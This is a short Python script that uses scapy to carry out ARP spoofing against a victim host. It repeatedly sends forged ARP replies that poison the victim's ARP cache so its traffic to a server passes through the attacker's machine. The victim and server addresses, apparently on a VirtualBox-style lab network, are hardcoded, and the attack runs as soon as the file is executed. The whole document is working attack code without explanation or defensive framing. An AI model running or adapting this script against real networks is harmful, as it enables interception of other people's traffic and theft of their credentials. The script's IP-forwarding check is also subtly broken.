from scapy.all import *
import netifaces


def getIpMac(interface):
    # Get the IP
    ip_address = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]

    # Get the MAC address
    mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]

    return ip_address, mac_address


def enable_ip_route():

    # Enable IP forwarding
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

    print("IP forwarding enabled")
    return


def spoofArp(interface, ipVictim, macVictim, ipOriginalTarget, macNewTarget):
    arp = Ether() / ARP()
    arp["Ether"].src = macNewTarget
    arp["ARP"].hwsrc = macNewTarget
    arp["ARP"].psrc = ipOriginalTarget
    arp["ARP"].hwdst = macVictim
    arp["ARP"].pdst = ipVictim
    # print(arp.summary())
    sendp(arp, verbose=0, iface=interface)


def execute(
    interface="enp0s3",
    ipVictim="192.168.56.101",
    macVictim="08:00:27:b7:c4:af",
    ipServer="192.168.56.102",
    loops=1000,
):
    ipHost, macHost = getIpMac(interface)

    # assuming that the IP forwarding is not enabled
    # enable_ip_route()

    print("Host adresses as MITM: ", ipHost, macHost)

    for i in range(loops):
        # sleep
        print("Spoofing...")

        # Spoof victim's ARP table
        spoofArp(interface, ipVictim, macVictim, ipServer, macHost)

        time.sleep(10)


execute()
